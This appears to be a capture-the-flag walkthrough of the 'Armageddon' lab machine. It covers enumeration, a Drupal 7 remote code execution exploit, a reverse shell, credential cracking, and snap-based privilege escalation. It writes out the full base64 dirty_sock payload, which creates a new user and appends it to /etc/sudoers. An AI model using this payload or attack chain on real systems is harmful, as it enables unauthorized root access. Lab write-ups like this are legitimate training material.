# @author : M3tr1c_r00t

![Armageddon](https://user-images.githubusercontent.com/99975622/202858878-ea0fc53e-b726-4ea8-acf9-bcfb43175592.png)

## Enumeration
You know the drill, nmap to see the open ports.
![Screenshot_2022-11-18_01_30_16](https://user-images.githubusercontent.com/99975622/202858941-81975815-689c-4d78-b2ea-2bd35b6c296c.png)
 
Only two ports are open:22 ssh and 80.

Next, we do a gobuster scan with the following options:

gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://IP -o gobusterlight.txt
![Screenshot_2022-11-18_01_30_25](https://user-images.githubusercontent.com/99975622/202859186-8f5e874f-c4ff-4243-8b74-141c330d6dc3.png)

on Visiting the sight, we can see that its a drupal site...

![Screenshot_2022-11-19_18_49_42](https://user-images.githubusercontent.com/99975622/202859434-c027d979-74ff-445d-bf5c-ca1e95ba01fa.png)
We can visit the robots.txt file in the server and see there's a changelog file...
![Screenshot_2022-11-18_01_32_55](https://user-images.githubusercontent.com/99975622/202859572-764dd45e-911b-42e6-83a7-7eb19da19729.png)
The CHANGELOG.txt file reveals to us that the server is running drupal 7.55.... nice! 
![Screenshot_2022-11-18_01_32_58](https://user-images.githubusercontent.com/99975622/202859619-20a7a6a3-b11b-450b-bfa4-a48555e2d6c1.png)

We can now use searchsploit and see if there are any exploits for this version of drupal...
![Screenshot_2022-11-18_01_33_34](https://user-images.githubusercontent.com/99975622/202859653-21f78b01-c518-4cdb-b162-798d356060f0.png)

One exploit which seems to be interesting is the RCE(Remote Code Execution) one.

We can get that exploit to our current directory and check out its options.
![Screenshot_2022-11-18_01_34_05](https://user-images.githubusercontent.com/99975622/202859772-0aef6c05-617d-4f42-ad29-9d1b72d71743.png)

Here's how it works... Assign the script the server's IP and then run it .
If it brings out an error, try installing the helpline ruby library using:
sudo apt-get update -y ruby-helpline -y
![Screenshot_2022-11-18_01_34_24](https://user-images.githubusercontent.com/99975622/202859842-fb0a3cfd-085e-4ca5-aacb-1a3834fd4bb2.png)

And we get a reverse shell;though a weak one.
We can improve our reverse shell by gaining onether using netcat so that its better and more responsive...
![Screenshot_2022-11-18_01_37_53](https://user-images.githubusercontent.com/99975622/202860034-7bcfadf9-36cf-4e0a-9a3f-f48b1da1e352.png)
We will have to save our bash script in the html form so that we can upload it. There was some error when uploading with the ".sh" extension.... probably some filtering was been done by the site....

The "wget" command wasnt avaialable so i used curl and output the contents of my file into a new one on the system.
 
![Screenshot_2022-11-18_01_38_48](https://user-images.githubusercontent.com/99975622/202860171-64fb2e3b-59c4-47bd-ba9d-1917f62a7c8b.png)

Next set up a listener and on the shell script, execute the file using bash and you get your shell.
![Screenshot_2022-11-18_01_39_05](https://user-images.githubusercontent.com/99975622/202860222-5484b1ec-feca-4be1-abfd-d16b890094a9.png)
Checking out the directories and files in the system, and on cheking out the site directory.... i find a config file in which has some creds.

![Screenshot_2022-11-18_01_40_20](https://user-images.githubusercontent.com/99975622/202860576-35c4dab2-5eaf-434e-a96e-8967697b0876.png)

After a bit of dead ends, i checked out the mysql inbuilt server and we got access,
![Screenshot_2022-11-18_01_41_59](https://user-images.githubusercontent.com/99975622/202860627-3dcb8bc0-098b-40fe-bdd3-9753e1d1ae5a.png)
I found a users table and we got more creds....

![Screenshot_2022-11-18_01_42_41](https://user-images.githubusercontent.com/99975622/202860656-8cffd547-5ba6-4e20-a98e-3255bb8a73c1.png)
I used johntheripper to crackthepassword and boom! we got the password.
![Screenshot_2022-11-18_01_44_32](https://user-images.githubusercontent.com/99975622/202860740-63e6d7e5-78e7-4c82-829a-951c45da01ac.png)

I tried to login into ssh using the password and it worked!
![Screenshot_2022-11-18_01_46_02](https://user-images.githubusercontent.com/99975622/202860765-975135d2-21fa-4bed-af87-4ef967ad9396.png)
## Priv Escalation
Checking sudo -l , we can see that we can run the sudo command which installing a package from snap...

There's an exploit package that I got from 0xdf's site

![Screenshot_2022-11-18_02_01_12](https://user-images.githubusercontent.com/99975622/202860996-0c2efc13-327e-42cf-8d58-bc6b5747eee0.png)

The exploit is known as dirty_sock. It creates a new user with root permissions.
Here's the **code:**
**
python -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > your_file_name
**

![Screenshot_2022-11-18_02_02_34](https://user-images.githubusercontent.com/99975622/202861303-70ef3c24-38a8-4df0-9ea1-cdc05b463b52.png)

After executing the file, you can cat /etc/passwd and see the dirty_sock user..
Move to the user and the password is the same as the username:dirty_sock

Then you can now move to the root user.
![Screenshot_2022-11-18_02_02_51](https://user-images.githubusercontent.com/99975622/202861329-e14272db-d774-4ce4-a610-6b82de16d684.png)
and you can get the root flag!
And done!

My socials:
          <br>@ twitter: twitter.com/M3tr1c_root
          <br>@ instagram: instagram.com/m3tr1c_r00t/

